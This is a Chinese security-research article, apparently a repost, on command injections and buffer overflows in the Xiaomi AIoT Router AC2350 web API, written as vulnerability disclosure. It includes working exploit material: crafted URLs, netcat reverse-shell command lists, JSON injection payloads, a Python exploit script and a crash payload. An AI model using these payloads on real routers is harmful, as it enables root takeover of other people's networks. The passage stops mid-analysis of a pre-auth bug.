#  小米WiFi路由器漏洞挖掘-WAN 命令注入、LAN 认证后堆栈缓冲区溢出、LAN 身份验证命令注入、WAN 堆栈缓冲区溢出   
 Ots安全   2024-03-28 12:09  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
我们的研究重点是MI AIoT Router AC2350在 LAN 和 WAN 接口上获得远程代码执行。我们在路由器中发现了多个漏洞，允许攻击者获得路由器的 root 访问权限。我们向小米发送了 8 份关于他们的HackerOne 错误赏金计划的报告- 根据他们的说法，所有错误都应该在最新的固件更新中得到修复。  
  
  
Aobo Wang 和 Jihong Cheng之前在 Hitcon 2020 上的研究展示了小米路由器中的各种漏洞。然而，在分析过程中，MI AIoT Router AC2350,我们发现 Wang 和 Cheng 先前在 2020 年发现的某些错误仍然存在。看来这些漏洞在我们路由器的最新固件更新中尚未得到纠正，包括Global 3.0.36 和 China 1.3.8。它们仅在 CVE 描述中指定的路由器版本中得到修复，即。 因此Mi AIoT Router AX3600.，我们决定将这些重新发现的错误与我们的新错误一起通知小米。  
  
  
**环境**  
  
小米销售多种基于OpenWrt的WiFi路由器。因此，Web功能是通过OpenWrt的luciLua包来提供的。幸运的是，与小米路由器的其他固件相比，包含Web功能的Lua脚本没有加密，使我们可以轻松分析代码并定位API函数。  
  
  
所有二进制文件都执行为root，因此，任何允许在路由器上执行任意代码的漏洞都将导致访问root。这很有趣，因为即使是通过 Web 界面发现的命令注入也会导致对操作系统的最高级别访问。  
  
  
与大多数 WiFi 路由器类似，路由器的 Web 界面上提供身份验证门户，并且不同的权限级别可保护对某些 API 功能的访问。在 Web 门户上进行身份验证后，会生成一个令牌并在 URL 中发送，以表明用户已通过身份验证。该授权令牌可以在 URL 参数中找到stok。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscY0qEiaibGJKMAKdCgZT6lQRoC0qTFcDkNK3nRYb0kxXa0CtlLGCaTo5Q/640?wx_fmt=png&from=appmsg "")  
  
此外，重要的是要记住，路由器运行在32-bit big-endian MIPS CPU：为了获得比固件可以提供的更多工具（busybox例如gdb，，，……），我们可以例如在线查找预编译的二进制文件或构建完整的工具链使用buildroot编译带有文件系统的内核，以便使用.gdbserverstracesocatQEMU  
  
  
最后，我们可以注意到，即使大多数二进制文件是在没有任何保护的情况下编译的（没有 PIE、没有 NX、没有堆栈金丝雀、部分/没有 RELRO），ASLR 在路由器上仍然处于活动状态。大端序不允许我们像小端序那样只覆盖地址的末尾。此外，非 PIE 二进制文件映射到0x00400000以空字节开头的虚拟地址，这会在以后的利用中给我们带来一些问题。  
  
  
**攻击面**  
  
WiFi 路由器有两个可访问的接口：LAN 和 WAN：一旦设备连接到其 WiFi，就可以访问 LAN 接口，并且可以通过互联网访问 WAN 接口。  
  
  
在LAN接口内，我们可以进一步区分预授权攻击和后授权攻击。预授权攻击可以通过任何连接到 WiFi 的设备进行，无需身份验证，而后授权攻击则需要在路由器的 Web 界面上进行身份验证（用户：密码），可通过 访问http://192.168.31.1。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscrjcFicsFMRbRYU6B8Of1p0Sq6NMmqeHibnxN1h3Yl8r9sIGshTVCPOwQ/640?wx_fmt=png&from=appmsg "")  
  
对于 LAN 漏洞，我们重点关注在路由器上执行命令的 Web API 函数。  
  
  
为了分析所有 API 函数，我们抓取了包含该字符串的每个文件，entry({"api"因为这就是端点源。此外，该技术使我们能够识别执行不同 API 调用所需的关联功能和授权级别。  
  
```
soeasy@ubuntu:~/router/fs $ grep -Rs "entry({\"api"
[...]
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "set_wifi_weak"}, call("setWifiWeakInfo"), (""), 286)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "get_wifi_weak"}, call("getWifiWeakInfo"), (""), 287)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "set_wan6"}, call("setWan6"), (""), 223, 0x08)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "ipv6_status"}, call("ipv6Status"), (""), 223, 0x08)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "miscan_switch"}, call("miscanSwitch"), (""), 290)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "get_miscan_switch"}, call("getMiscanSwitch"), (""), 291)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "set_wifi_txbf"}, call("setWifiTxbf"), (""), 295)
usr/lib/lua/luci/controller/api/xqnetwork.lua:    entry({"api", "xqnetwork", "set_wifi_ax"}, call("setWifiAx"), (""), 296)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome"}, firstchild(), _(""), 500)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request"}, call("tunnelSmartHomeRequest"), _(""), 501)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_smartcontroller"}, call("tunnelSmartControllerRequest"), _(""), 502)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_miio"}, call("tunnelMiioRequest"), _(""), 503)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_mitv"}, call("requestMitv"), _(""), 504)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_yeelink"}, call("tunnelYeelink"), _(""), 505)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_camera"}, call("requestCamera"), _(""), 506)
usr/lib/lua/luci/controller/api/xqsmarthome.lua:    entry({"api", "xqsmarthome", "request_miiolist"}, call("requestMiioList"), _(""), 507)
 
soeasy@ubuntu:~/router/fs $ grep -Rs "entry({\"api" | wc -l
476
```  
  
  
然后我们可以这样解释每一行：  
  
```
--- API endpoint: `/api/xqnetwork/pppoe_catch` - Corresponding Lua function: `pppoeCatch()` - Authorization Flag: `0x09`
entry({"api", "xqnetwork", "pppoe_catch"}, call("pppoeCatch"), (""), 264, 0x09)
```  
  
  
要了解授权标志（这显然是小米实现的自定义功能，因为它不在原始 luci 的源代码中），我们可以查看/usr/lib/lua/luci/dispatcher.lua.  
  
```
[...]
function _remoteAccessForbidden(flag)
    if flag == nil then
        return false
    end
    if bit.band(flag, 0x02) == 0x02 then
        return true
    else
        return false
    end
end
[...]
```  
  
  
不同的授权标志如下，当然可以组合：  
- 0x01：“_noauthAccessAllowed”  
  
- 0x02：“_remoteAccessForbidden”  
  
- 0x04：“_syslockAccessAllowed”  
  
- 0x08：“_noinitAccessAllowed”  
  
- 0x10: “_sdkFilter”  
  
我们发现了大约 500 个 API 端点，并启动了对所有端点进行分析的繁重工作，并根据权限级别将它们分为几类。 Lua 代码中的第一个目标函数是os.execute, forkExec, io.popen... 因为它们允许在路由器上直接执行命令。然而，我们还深入研究了分支到路由器二进制文件的功能，以便通过逆向工程找到较低级别的漏洞。  
  
  
事实上，某些 API 函数将通过 URL 直接调用具有用户控制参数的二进制文件来执行某些任务。这意味着，如果被调用的二进制文件存在漏洞，则特制的 URL 可能会导致被调用程序中的代码执行。  
  
  
**WAN**  
  
对于WAN漏洞，我们按照Pwn2Own的方法拦截WAN接口上的流量来解决这个问题。作为中间人，我们使用 模拟服务器DHCP，从而将流量重定向到我们的机器。我们注意到许多请求，使我们和任何攻击者都能够拦截和修改流量。事实证明，这对于发现漏洞非常有效，我们将在本文后面看到。DNSdnsmasqHTTP  
  
  
**漏洞详情**  
  
在本节中，我们将详细介绍我们在路由器中发现的多个漏洞。最初的目标是在路由器上拥有一个 root shell，因为它将对将来的调试有用。关于授权级别，我们遵循自下而上的方法：因此，我们首先查看具有最高授权级别的 LAN 接口（LAN 后授权），继续进行 LAN 预身份验证，最后查看 WAN。  
  
  
为了分析 LAN 攻击面，我们只关注 Web 界面。意思是，我们的研究包括跟踪不同的端点并静态审核他们的代码。  
  
  
**授权后**  
  
授权后意味着身份验证令牌随请求一起发送，因此需要管理员密码。最终，我们在局域网授权后面上发现了三个RCE。虽然其中两个错误是重复的，但它们仍然起到了作为路由器立足点的作用，这极大地帮助了搜索其他漏洞。  
  
  
端点/api/xqnetwork/set_wan6- 命令注入（已称为 CVE-2020-14100）  
  
第一个漏洞是 2020 年已知的 RCE。未经净化的 url 参数被注入到 shell 命令中，从而导致任意命令注入。小米已知此命令注入，但在此特定固件中并未修复。  
  
  
API 端点/api/xqnetwork/set_wan6用于设置 IPv6 设置，调用setWan6()中的函数/usr/lib/lua/luci/controller/api/xqnetwork.lua，并接受多个 url 参数。 url 参数dns1可以被滥用在方法中注入命令XQFunction.forkExec()，该方法在路由器上执行 bash 命令。这个漏洞可以在这里看到：  
  
```
function index()
    local page   = node("api","xqnetwork")
    page.target  = firstchild()
    page.title   = ("")
    page.order   = 200
    page.sysauth = "admin"
    page.sysauth_authenticator = "jsonauth"
    page.index = true
    [...]
    entry({"api", "xqnetwork", "set_wan6"}, call("setWan6"), (""), 223, 0x08)
    [...]
 
function setWan6()
    [...]
    --- `dn1` is retrieved here
    local dns1 = XQSecureUtil.parseCmdline(LuciHttp.formvalue("dns1"))
    local dns2 = XQSecureUtil.parseCmdline(LuciHttp.formvalue("dns2"))
 
    if XQFunction.isStrNil(wanType)
        and XQFunction.isStrNil(ip6addr)
        and XQFunction.isStrNil(ip6gw)
        and XQFunction.isStrNil(ip6prefix) then
            code = 1502
    else
        if wanType == "native" then
            if XQFunction.isStrNil(dns1) and XQFunction.isStrNil(dns2) then
                XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native")
            elseif not XQFunction.isStrNil(dns1) and XQFunction.isStrNil(dns2) then
                XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native " .. dns1)
            elseif XQFunction.isStrNil(dns1) and not XQFunction.isStrNil(dns2) then
                XQFunction.forkExec("sleep 2; /etc/init.d/ipv6 native " .. dns2)
            else
                --- `dns1` is injected into a shell command here by a simple concatenation!
                XQFunction.forkExec(
                    "sleep 2; /etc/init.d/ipv6 native " .. dns1 .. ',' .. dns2
                )
    [...]
```  
  
  
这里潜在有问题的函数是XQSecureUtil.parseCmdline在 中声明的解析函数/usr/lib/lua/xiaoqiang/util/XQSecureUtil.lua，它将尝试通过转义不同的字符来清理输入。  
  
```
function parseCmdline(str)
    if XQFunction.isStrNil(str) then
        return ""
    else
        return str:gsub("\\", "\\\\")
                  :gsub("`", "\\`")
                  :gsub("\"", "\\\"")
                  :gsub("%$", "\\$")
                  :gsub("%&", "\\&")
                  :gsub("%|", "\\|")
                  :gsub("%;", "\\;")
    end
end
```  
  
  
由于受到 shell 命令注入的困扰，该dns1变量可以填充\n（0x0a十六进制）以添加任意命令。事实上，\n绕过了该函数所做的安全检查XQSecureUtil.parseCmdline。例如，注入 API URL 中的以下有效负载netcat在 IP192.168.31.161和端口上发出连接请求8282：dns1=anything%0anc 192.168.31.161 8282  
  
  
示例网址：http://192.168.31.1/cgi-bin/luci/;stok=3ab3ea7324a1eb604be37dff197cf504/api/xqnetwork/set_wan6?wanType=native&dns1=anything%0anc%20192.168.31.161%208282  
  
  
我们可以在路由器上执行任何命令，但有一些限制。某些字符使用反斜杠进行转义，但我们可以运行 ased来删除反斜杠以“取消转义”字符。例如，以下命令列表会在路由器上弹出反向 shell：  
  
```
commands = [
    f"rm -f /tmp/f",
    f"mknod /tmp/f p",
    f"echo 'cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f' > revshell.sh",
    f'sed -i \'s/\\//g\' revshell.sh',
    f"sh revshell.sh"
]
```  
  
  
因此，我们在路由器上有一个反向 shell：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscKzv6bYIL5YywrYrhKuibrQXMghj8n7lw6M9oN48PuUY2RfQr1PAmhsg/640?wx_fmt=png&from=appmsg "")  
  
远程代码执行  
  
  
该漏洞实际上是CVE-2020-14100的重复，我们是偶然重新发现的。但是我们现在在路由器上有了第一个根反向 shell，对整个文件系统没有限制，太棒了！  
  
  
**端点/api/xqsmarthome/request_smartcontroller- 命令注入 (CVE-2023-26319)**  
  
授权后 API 端点/api/xqsmarthome/request_smartcontroller旨在与网络上的智能家居设备进行交互，在 url 参数中实现/usr/lib/lua/luci/controller/api/xqsmarthome.lua并接受 url 参数payload。  
  
```
function index()
    local page   = node("api","xqsmarthome")
    page.target  = firstchild()
    page.title   = ("")
    page.order   = 500
    -- We have to be authenticated to access this API
    page.sysauth = "admin"
    page.sysauth_authenticator = "jsonauth"
    page.index = true
    entry({"api", "xqsmarthome"}, firstchild(), _(""), 500)
    entry({"api", "xqsmarthome", "request"}, call("tunnelSmartHomeRequest"), _(""), 501)
    -- API endpoint `request_smartcontroller` is defined here 
    entry({"api", "xqsmarthome", "request_smartcontroller"}, call("tunnelSmartControllerRequest"), _(""), 502)
    entry({"api", "xqsmarthome", "request_miio"}, call("tunnelMiioRequest"), _(""), 503)
    entry({"api", "xqsmarthome", "request_mitv"}, call("requestMitv"), _(""), 504)
    entry({"api", "xqsmarthome", "request_yeelink"}, call("tunnelYeelink"), _(""), 505)
    entry({"api", "xqsmarthome", "request_camera"}, call("requestCamera"), _(""), 506)
    entry({"api", "xqsmarthome", "request_miiolist"}, call("requestMiioList"), _(""), 507) 
end
 
[...]
 
function tunnelSmartControllerRequest()
    local XQLog = require("xiaoqiang.XQLog")
    local XQCryptoUtil = require("xiaoqiang.util.XQCryptoUtil")
    local LuciJson = require("json")
    local http_data = LuciJson.decode(LuciHttp.formvalue("payload"))
    -- Our `payload` is base64 encoded
    local payload = XQCryptoUtil.binaryBase64Enc(LuciHttp.formvalue("payload"))
 
    [...]
 
    local cmd = XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER % payload
	local LuciUtil = require("luci.util")
    -- Some command containing our `payload` is executed here
    LuciHttp.write(LuciUtil.exec(cmd))
end
```  
  
  
在这里我们可以看到我们的意志payload被base64编码，然后格式化为字符串XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER，结果将被执行LuciUtil.exec。我们来看看XQConfigs.THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLERin的值/usr/lib/lua/xiaoqiang/common/XQConfigs.lua。  
  
```
THRIFT_TUNNEL_TO_DATACENTER = "thrifttunnel 0 '%s'"
THRIFT_TUNNEL_TO_SMARTHOME = "thrifttunnel 1 '%s'"
THRIFT_TUNNEL_TO_SMARTHOME_CONTROLLER = "thrifttunnel 2 '%s'"
THRIFT_TO_MQTT_IDENTIFY_DEVICE = "thrifttunnel 3 ''"
THRIFT_TO_MQTT_GET_SN = "thrifttunnel 4 ''"
THRIFT_TO_MQTT_GET_DEVICEID = "thrifttunnel 5 ''"
THRIFT_TUNNEL_TO_MIIO = "thrifttunnel 6 '%s'"
THRIFT_TUNNEL_TO_YEELINK = "thrifttunnel 7 '%s'"
THRIFT_TUNNEL_TO_CACHECENTER = "thrifttunnel 8 '%s'"
```  
  
  
因此，这将通过执行以下命令payload传递给二进制文件： 。thrifttunnelthrifttunnel 2 '[BASE64 PAYLOAD]'  
  
  
在查看thrifttunnel二进制文件时，我们可以看到该选择2会将有效负载“传输”到smartcontroller通过ubusIPC 系统调用的服务。  
  
```
// _ftext is basically the main function of the `thrifttunnel` binary
int32_t _ftext(int32_t argc, char** argv, char** envp) {
    [...]
    case 2:
    {
        uloop_init();
        int32_t _ubus_ctx = ubus_connect(data_412050);
        ubus_ctx = _ubus_ctx;
        int32_t ubus_id;
 
        if (_ubus_ctx != 0)
        {
            uloop_fd_add((_ubus_ctx + 0x2c), 9);
            ubus_id = ubus_lookup_id(ubus_ctx, "smartcontroller", 0x412074);
            
            if (ubus_id == 0)
            {
                blob_buf_init(0x41205c, 0);
                blobmsg_add_field(0x41205c, 3, "request", s2_1, (strlen(s2_1) + 1));
                s0_4 = nullptr;
                int32_t v0_19 = ubus_invoke_fd(ubus_ctx, data_412074, "process_request", data_41205c, 0x400f00, 0, 0x1388, 0xffffffff);
                a0_11 = ubus_ctx;
    [...]
```  
  
  
我们可以通过说有效负载最终作为参数传递给/usr/sbin/smartcontroller二进制文件来简化这个过程。  
  
  
在寻找此smartcontroller二进制文件中的漏洞时，我们注意到可以通过mac参数进行命令注入，并且如果可以到达，则可以允许远程代码执行。该漏洞位于0x4061d4我们重命名为 的函数中run_sysapi_macfilter。  
  
```
int32_t run_cmd(char* cmd)
{
    int32_t ret = 0;
 
    if (is_empty_str(cmd) == 0)
    {
        log(2, "system command: %s\n", cmd);
        int32_t system_res;
        int32_t a2_2;
 
        // Command executed using the `sytem()` function
        system_res = system(cmd);
        ret = 1;
 
        if (system_res != 0)
        {
            log(2, "system call error\n", a2_2);
            ret = 0;
        }
    }
    return ret;
}
 
// the `mac` parameter is user controlled
int32_t run_sysapi_macfilter(char* mac, int32_t enabled)
{
    char* const yes_no;
    char cmd_buffer[0x64];
    memset(&cmd_buffer, 0, 0x64);
    
    if (enable != 0)
    {
        yes_no = "no";
    }
    else
    {
        yes_no = "yes";
    }
 
    sprintf(&cmd_buffer,
            "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
            mac,
            a3);
    // `mac` is directly injected into `system()`!
    return run_cmd(&cmd_buffer);
}
```  
  
  
由于mac参数是用户控制的并直接传递给run_cmd，我们可以在路由器上执行任何命令，但我们首先需要了解如何与smartcontroller二进制文件正确交互以实现这个有趣的功能。  
  
  
在逆向smartcontroller二进制文件时，我们可以看到有效负载必须格式化为带有“命令”字段的 JSON。我们可以在我们命名scene_command_parser为的函数中看到不同的可能命令0x401dc0。  
  
```
int32_t scene_command_parser(char* command)
{
    void* json_object;
    int32_t a2;
    json_object = json_tokener_parse(command);
    char const* const error_msg;
    if (json_object == 0)
    {
        error_msg = "request is not a json object\n";
    }
    else
    {
        void* cmd_json_object;
        cmd_json_object = json_object_object_get(json_object, "command");
        if (cmd_json_object != 0)
        {
            int32_t cmd_string = json_object_get_string(cmd_json_object);
            int32_t s0_3;
            int32_t v0_11;
            if (strcmp(cmd_string, "scene_setting") == 0)
            {
                int32_t v0_12;
                int32_t a2_6;
                v0_12 = strcmp(cmd_string, "get_scene_setting");
                if (v0_12 == 0)
                {
                    if (strcmp(cmd_string, "get_single_scene_setting") == 0)
                    {
                        if (strcmp(cmd_string, "get_multiple_scene_setting") == 0)
                        {
                            if (strcmp(cmd_string, "scene_update") == 0)
                            {
                                if (strcmp(cmd_string, "scene_start") == 0)
                                {
                                    if (strcmp(cmd_string, "scene_stop") == 0)
                                    {
                                        if (strcmp(cmd_string, "scene_launch") == 0)
                                        {
                                            if (strcmp(cmd_string, "scene_launch_delete") == 0)
                                            {
                                                if (strcmp(cmd_string, "scene_delete") == 0)
                                                {
                                                    if (strcmp(cmd_string, "scene_start_by_device_status") == 0)
                                                    {
                                                        if (strcmp(cmd_string, "is_scene_processing") == 0)
                                                        {
                                                            if (strcmp(cmd_string, "get_scene_count") == 0)
                                                            {
                                                                if (strcmp(cmd_string, "reset_scenes") == 0)
                                                                {
                                                                    if (strcmp(cmd_string, "scene_start_by_crontab") != 0)
                                                                    {
```  
  
  
对于那些真正关注的人，我们可以在这里看到，strcmp如果字符串不相等，则返回 0，这与通常发生的情况相反：这是因为strcmp这里使用的是自定义实现。  
  
  
在同一个函数中，我们可以看到我们感兴趣的函数的唯一交叉引用run_sysapi_macfilter，例如命令“scene_setting”。  
  
  
在对命令解析过程进行了一些逆向工程之后，我们为 API 构建了以下有效负载，/api/xqsmarthome/request_smartcontroller然后可以使用该负载通过使用将阻止 MAC 地址的命令创建一个新的“场景”来对 RCEscene_setting进行 POC - 这将在事实上，这是我们的命令注入有效负载。  
  
```
{
    "command":"scene_setting",
    "name":"it3",
    "action_list":[
            {
                "thirdParty":"xmrouter",
                "delay":17,
                "type":"wan_block",
                "payload":
                    {
                        "command":"wan_block",
                        // Command Injection - making an exterior connection
                        "mac":";nc 192.168.31.161 4242;#"
                    }
            }
        ],
    "launch":
        {
            "timer":
                {
                    "time":"2:2",
                    "repeat":"0",
                    "enabled":true
                }
        }
}
```  
  
  
然后，我们需要使用命令来启动这个场景scene_start_by_crontab。  
  
```
{
    "command":"scene_start_by_crontab",
    "time":"2:2",
    "week":0
}
```  
  
  
可以编写一个简单的Python脚本来利用该漏洞：  
  
```
import requests
 
AUTH_TOKEN = "bd3ff46458f812a97b4e9f10945c6ce5"
 
URL = f"http://192.168.31.1/cgi-bin/luci/;stok={AUTH_TOKEN}/api/xqsmarthome/request_smartcontroller"
 
command = "nc 192.168.31.161 4242"
 
requests.post(URL, data={
    "payload":'{"command":"scene_setting","name":"it3","action_list":[{"thirdParty":"xmrouter","delay":17,"type":"wan_block","payload":{"command":"wan_block","mac":";' + command + ';#"}}],"launch":{"timer":{"time":"2:2","repeat":"0","enabled":true}}}'
})
requests.post(URL, data={
    "payload":'{"command":"scene_start_by_crontab","time":"2:2","week":0}'
})
```  
  
  
这样，我们就可以收到与侦听器的连接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsc2J8RJBpM6Jxn6ZNf44IAcUke3JnNTxO5bTmsvxg2rWU0zUYMVpSICw/640?wx_fmt=png&from=appmsg "")  
  
通过二进制system文件中的注入/usr/sbin/smartcontroller，我们现在可以验证另一个 LAN 授权后 RCE 漏洞，这次不是重复的！  
  
  
**端点/api/xqsmarthome/request_smartcontroller- 堆栈缓冲区溢出 (CVE-2023-26318)**  
  
在与上述漏洞相同的代码部分中，我们可以看到它smartcontroller也容易受到堆栈缓冲区溢出的影响。该mac参数是用户控制的，使用 直接注入到堆栈缓冲区中，这意味着不检查sprintf()复制到的字符串的长度。cmd_buffer  
  
```
// the `mac` parameter is user controlled
int32_t run_sysapi_macfilter(char* mac, int32_t enabled)
{
    char* const yes_no;
    char cmd_buffer[0x64];
    memset(&cmd_buffer, 0, 0x64);
    
    if (enable != 0)
    {
        yes_no = "no";
    }
    else
    {
        yes_no = "yes";
    }
 
    // `mac` is directly injected into the `cmd_buffer` (stack buffer) without length check! 
    sprintf(&cmd_buffer,
            "/usr/sbin/sysapi macfilter set mac=%s wan=%s;/usr/sbin/sysapi macfilter commit",
            mac,
            a3);  
    return run_cmd(&cmd_buffer);
}
```  
  
  
然后我们可以生成一个快速 PoC 来覆盖返回地址并将程序计数器设置PC为0xdeadbeef：  
  
  
第一个有效载荷  
  
```
{
    [...]
    // payload is basically the same as the previous one
    // mac: A * 81 + 0xdeadbeef (URL encoded)
    "mac":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%de%ad%be%ef"
    [...]
}
```  
  
  
第二个有效载荷  
  
```
{
    "command":"scene_start_by_crontab",
    "time":"2:2",
    "week":0
}
```  
  
  
然后我们可以在 gdb 中检查我们是否有效地控制了PC：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdsc8pYds4QSwBYWwZiaCU7olomY05eGcSCevSxBjn2mticUl3PWMo17NnTA/640?wx_fmt=png&from=appmsg "")  
  
sprintf不幸的是，由于该漏洞来自格式化程序的使用%s，因此我们不能在有效负载中使用 NULL 字节。因此，我们不能使用 ROP 小工具在二进制文件中执行任意代码，因为我们知道二进制文件的基地址是0x00400000（以 NULL 字节开头），并且由于字节顺序，我们不能仅仅进行部分地址覆盖。  
  
  
例如，漏洞利用需要 ASLR 暴力破解（这在 32 位系统上是合理的）或 ASLR 泄漏。不幸的是，二进制文件崩溃时不会重新启动，因此几乎不可能进行暴力破解，但它仍然是一种 DoS。由于我们已经发现了几个 RCE，因此我们决定不再花太多时间在这个不平凡的漏洞利用上。  
  
  
端点/api/xqsmarthome/request_smartcontroller- 另一个命令注入  
  
在向小米提交了之前的报告后，我们对 LAN 授权后研究感到满意，因为我们找到了一种在路由器上获取 root shell 的方法，并且还发现了符合其错误赏金计划的非重复 RCE。  
  
  
然而，很快，对该程序的第二次通读smartcontroller发现了另一个命令注入。不幸的是，我们之前关于二进制文件的报告引起了小米的注意，他们显然在我们的报告之前不久就发现了这种注入。它再次重复，但它教会我们在匆忙报告错误之前完全完成安全审核。  
  
  
feedPush第二个命令注入位于我们重命名为 的方法中0x405384。该scene_name参数是直接注入的，system()没有在run_cmd_arg函数中进行任何清理。  
  
```
int32_t run_cmd_arg(char* cmd, char* arg)
{
    int32_t ret;
    if (is_empty_str(cmd) != 0)
    {
        ret = 0;
    }
    else
    {
        if (is_empty_str(arg) != 0)
        {
            return run_cmd(cmd);
        }
 
        int32_t len = strlen(cmd) + strlen(arg) + 5;
        char* final_command = malloc(len);
        memset(final_command, 0, len);
 
        // Here, an attempt of escaping `arg` to try to avoid command injections 
        sprintf(final_command, "%s '%s'", cmd, arg);
 
        // The final command is then executed with `system()`
        ret = run_cmd(final_command);
 
        free(final_command);
    }
    return ret;
}
 
int32_t feedPush(scene_struct* scene)
{
    json_object* new_dupe = json_object_new_object();
    json_object_object_add(new_dupe, "type", json_object_new_int(5));
    json_object* new_obj = json_object_new_object();
 
    // `scene_name` is user controlled
    json_object_object_add(new_obj, "name", json_object_new_string(scene->scene_name));
    
    [...]
    json_object_object_add(new_dupe, "data", new_obj);
 
    // user controlled data is duplicated and stringified
    char* duplicate_data = strdup(json_object_to_json_string(new_dupe));
 
    int32_t v0_6 = json_object_put(new_dupe);
    if (duplicate_data == 0)
    {
        return v0_6;
    }
 
    // `duplicate_data` is directly injected into `system()`
    run_cmd_arg("/usr/sbin/feedPush", duplicate_data);
    return free(duplicate_data);
}
```  
  
  
run_cmd_arg我们可以使用一个简单的技巧 ( )轻松转义引号$(shell command)并注入scene_name.为了 PoC 这个漏洞，我们可以使用这两个有效负载（同样，与之前的类似）：  
  
  
第一个有效载荷  
  
```
{
    "command":"scene_setting",
    // Command Injection - making an exterior connection
    "name":"'$(nc 192.168.31.98 4242)'",
    [...] // same as before
}
```  
  
  
第二个有效载荷  
  
```
{
    "command":"scene_start_by_crontab",
    "time":"2:2",
    "week":0
}
```  
  
  
这样，我们就会收到与侦听器的连接并确认 RCE：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscfUjnqK70ibmyj70279cGa5zmqD00LmCafVD5Rsawe9PvFQdcs6kOutg/640?wx_fmt=png&from=appmsg "")  
  
**预授权**  
  
现在我们知道，授权后 LAN 受到多个错误的影响，这些错误使我们能够在小米路由器上获取 root shell：为此，我们需要路由器 Web 界面的管理员密码来检索身份验证令牌。当然，如果我们可以绕过这一步，那就更有趣了：我们的下一阶段是研究预授权 LAN 接口，以便任何连接到 WiFi 的用户都可以利用路由器。  
  
  
该 LAN 预认证表面上的漏洞是在lua_rsa_pubkey_encrypt()小米/usr/lib/lua/librsa.so库的方法中发现的。使用端点的名称，我们猜测此功能简化了通过链接共享 WiFi 密码的过程。此函数在通过路由器接口的 API 端点进行身份验证之前公开：http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=。  
  
  
**端点/api/misystem/get_wifi_pwd_url- pk_free()**  
  
首先，当给出格式错误的 RSA 公钥时，我们可以在(called by )中的未初始化指针上触发对pk_free()from的调用。正如我们将看到的，这个错误理论上可能会通过仔细组织堆栈而导致远程代码执行。libembedtls.sopublic_encrypt_keybuf()lua_rsa_pubkey_encrypt()  
  
```
int32_t public_encrypt_keybuf(char* url, int32_t url_len, int32_t* arg3, int32_t* arg4, char* controlled_key, int32_t key_len)
{
    int32_t ret_code;
    void* pk_ctx;
    int32_t b64_needed_len = 0;
    
    base64_decode(0, &b64_needed_len, controlled_key, key_len);
    if (sys_log_enable != 0)
    {
        syslog(6, " rsa crypto  base64_decode need …", b64_needed_len);
    }
 
    char* b64 = calloc((b64_needed_len + 1), 1);
    int32_t err_code = base64_decode(b64, &b64_needed_len, controlled_key, key_len);
    if (err_code == 0)
    {
       [..]
    }
    else
    {
        if (sys_log_enable != 0)
        {
            syslog(6, " rsa crypto  base64_decode faile…", err_code);
        }
        ret_code = 101;
 
        // This is freed but was never initialized if(err_code != 0) 
        pk_free(&pk_ctx);
        free(b64);
    }
    return ret_code;
}
```  
  
  
要触发该pk_free()错误，我们只需发送包含非 Base64 字符的格式错误的 RSA 公钥。例如：http://192.168.31.1/cgi-bin/luci/api/misystem/get_wifi_pwd_url?rsa_pubkey=%01。  
  
  
在 GDB 中，我们可以看到未映射的地址在以下位置被取消引用pk_free()：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taexa7YMMkONpKcUPiaiaVwdscnPdgwMpib9Q04FL8OqicibbmBHcultzK6mNlxgibyJ9kBuusDzkhyym9ow/640?wx_fmt=png&from=appmsg "")  
为了更多地了解这个漏洞，让我们看一下我们可以在网上找到的该pk_free()函数的源代码： libmbedtls  
  
```
/*
 * Free (the components of) a pk_context
 */
void pk_free( pk_context *ctx )
{
    if( ctx == NULL || ctx->pk_info == NULL )
        return;
 
    ctx->pk_info->ctx_free_func( ctx->pk_ctx );
 
    polarssl_zeroize( ctx, sizeof( pk_context ) );
}
```  
  
  
